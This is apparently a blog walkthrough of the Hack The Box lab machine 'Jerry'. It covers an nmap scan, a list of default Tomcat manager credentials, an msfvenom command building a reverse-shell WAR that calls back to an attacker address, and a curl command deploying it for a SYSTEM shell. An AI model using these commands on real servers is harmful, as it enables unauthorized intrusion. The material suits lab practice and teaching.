![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3619cc3b-21db-49ff-a79c-428fdc70a66d)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Sun Jun  4 23:45:28 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 8080 -Pn 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun  4 23:45:42 2023 -- 1 IP address (1 host up) scanned in 14.31 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ca145581-c254-44b6-a8e8-c3a7a10bce7a)

there's a web server running on port `8080`, opening it on a browser, we can see it is running `apache tomcat 7.0.88`. let's exploit this service.
The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But this path is protected by basic HTTP auth, the most common credentials are:
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
tomcat:s3cret
admin:s3cret
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c97a5819-0edd-47f1-a063-9a18bd36aa74)

using cred `tomcat:s3cret` and boom it worked. let's get RCE by uploading a war file.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=1337 -f war -o revshell.war                               
Payload size: 1093 bytes
Final size of war file: 1093 bytes
Saved as: revshell.war
```
first we generate a war reverse shell using msfvenom. now let's deploy the war file.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Jerry]
└─$ curl --upload-file revshell.war -u 'tomcat:s3cret' "http://10.10.10.95:8080/manager/text/deploy?path=/revshell"
OK - Deployed application at context path /revshell
```
first we deployed the war file using curl.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b9873734-a203-42f0-9ff5-a8e3682e99ae)

after deploying the file, used curl to trigger the reverse shell and boom we got a  reverse shell as `nt authority\system`
